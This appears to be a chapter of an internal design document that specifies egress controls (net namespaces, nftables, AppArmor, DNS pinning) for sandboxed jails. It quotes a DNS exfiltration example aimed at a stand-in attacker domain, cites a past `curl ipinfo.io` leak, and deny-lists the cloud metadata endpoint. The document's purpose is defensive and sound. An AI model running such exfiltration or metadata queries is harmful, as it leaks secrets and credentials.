# 09 — Network Isolation

The leak's sixth disclosure (`curl https://ipinfo.io`) is the canonical
example of why every other layer is incomplete without network
isolation. This chapter specifies the egress story.

## What "deny network" means at each layer

| Layer | What it blocks | What it doesn't |
|---|---|---|
| **Network namespace** (`--unshare-net`) | All host NICs invisible; only loopback exists | An attacker can still bind to loopback and read it from the same ns |
| **nftables on host** | Outbound packets from a cgroup or uid | Doesn't apply if the packet never leaves the namespace (vs. inside-ns blocking) |
| **per-net-ns nftables** | Per-jail outbound rules | Requires veth pair setup, more ops |
| **AppArmor `deny network`** | `socket()` syscall itself fails | Doesn't filter by destination |
| **Squid forward proxy** | HTTP/HTTPS calls that respect `HTTP_PROXY` env | Doesn't apply to raw TCP, ICMP, DNS exfil, or programs that ignore env |
| **HTTP_PROXY env poisoning** (today) | curl/wget/fetch when they read env | Defeated by any binary that ignores env (Go programs, raw sockets) |

Today's Doable: `HTTP_PROXY=0.0.0.0:1` set in env (`systemd.ts:62-69`,
`windows.ts:78-85`). That's all. It defeats `curl` and `npm` if they
honor the env. It does not defeat any other binary. The 2026-05-09
leak's `curl` happened to be the env-honoring kind — but that's
accident, not design.

## The recommended design

Three layers, composed:

1. **net-ns** per jail (cheap, always-on).
2. **per-net-ns nftables** with default-deny and per-profile
   allowlist (the real enforcement).
3. **AppArmor `deny network`** for profiles that need zero socket
   syscalls (e.g., a workload that should only do file I/O).

Plus optionally:

- **Squid as transparent proxy** for the application-layer audit
  trail (every outbound HTTPS request gets a log line). Squid is a
  defense-in-audit, not a defense-in-depth.

### Why per-net-ns vs. cgroup-bpf

cgroup-v2's `IPAddressDeny`/`IPAddressAllow` (which dovault's
`systemd.ts` already supports at `:53-57`) blocks by destination IP
in BPF. That works but has two real limits:

- It's IP-based. To allow `registry.npmjs.org`, you have to know
  every IP it resolves to. DNS rotation breaks the rules.
- It's host-wide. If two jails on the same host need different
  allowlists, you need cgroup nesting tricks.

Per-net-ns nft can filter by *resolved* destination *and* by uid (so
the project user 9000 has different rules than the project user
9001, even on the same host).

## The mechanics

Inside a `bwrap --unshare-net` jail, the new net-ns has only `lo`.
To allow outbound, the orchestrator's `nft-egress` composer:

1. Creates a veth pair (`veth-<projectId>-in` + `veth-<projectId>-out`).
2. Moves the inner end into the jail's net-ns.
3. On the host side, the outer veth is attached to a per-project
   nft chain.
4. The nft chain default-drops, then allows:
   - DNS to a pinned resolver (e.g., `127.0.0.53` if systemd-resolved,
     or a Squid-side resolver).
   - HTTPS to hostnames in the profile's `network.allow` list,
     resolved at chain-build time and refreshed on a 5-minute
     timer.
5. On jail exit, the veth pair is destroyed and the nft chain is
   garbage-collected.

This is exactly what Podman/Docker's network plugin does internally.
Doable's version is smaller because it's per-spawn rather than
per-container-lifecycle.

### Profile shape

```ts
network: {
  defaultAction: "deny",        // or "allow", per workspace
  allow: [
    "registry.npmjs.org",
    "esm.sh",
    "*.sentry.io",
  ],
  deny: [
    "ipinfo.io", "*.ipinfo.io",
    "169.254.169.254",            // cloud metadata
    "metadata.google.internal",
  ],
}
```

`deny` takes precedence over `allow`. Wildcards (`*.foo.com`) match
DNS labels.

## DNS exfil

A standard attack: encode 32 bytes of secret into a base32 hostname
and `dig sneaky-data.attacker.com` — the resolver, talking through
*any* allowed outbound, ships the data to the attacker's authoritative
DNS server.

Mitigations:

1. Pin DNS to a Doable-controlled resolver (e.g., `dnsmasq` on the
   host with a Doable-shaped upstream).
2. The pinned resolver refuses any name not in a static allowlist
   matching the profile's `network.allow`.
3. nft also drops UDP/53 to anywhere but the pinned resolver.

This is more work than the rest. Phase it in — chapter 11.

## The metadata endpoint

`169.254.169.254` is the AWS/GCP/Azure cloud-metadata endpoint. On
many VPS providers (including OVH for zantaz), there's an analog at
a private IP that returns provisioning info, sometimes including
credentials. **Always denied** by the default profile, regardless
of workspace setting.

## Mistakes to avoid

- **Don't rely on `HTTP_PROXY` env alone.** That's today. It's
  honored by curl/node/python but ignored by Go binaries and any
  manually-written socket code. Move it to a defense-in-depth
  belt-and-braces line, not the primary control.
- **Don't open a single allow rule for "any HTTPS".** Egress
  allowlists must be hostname-specific.
- **Don't allow `0.0.0.0/0:443`.** Same as above; an attacker
  picks any port-443 server.
- **Don't trust the project's `package.json` to declare its
  egress needs.** Profile lists are operator-curated.

## Implementation order

1. Add per-spawn net-ns to bwrap profile (already supported by the
   backend; just toggle `ns.net: "egress-allowlist"`).
2. Add the `nft-egress` composer:
   `packages/dovault/src/composers/nft-egress.ts`. Probes for `nft`
   binary; on absence in `prod`, fail closed.
3. Pin DNS via dnsmasq in `setup-server.sh`. Configure the resolver
   to refuse names outside an aggregate allowlist.
4. AppArmor profile additions: `deny network udp` for `ai-bash`
   (most won't need UDP at all).
5. Squid as transparent audit proxy: opt-in via
   `DOABLE_SQUID_AUDIT=1`. Logs every CONNECT to an audit table.
6. Migrate today's `HTTP_PROXY=0.0.0.0:1` to a true sinkhole that
   logs (instead of just rejecting connections).
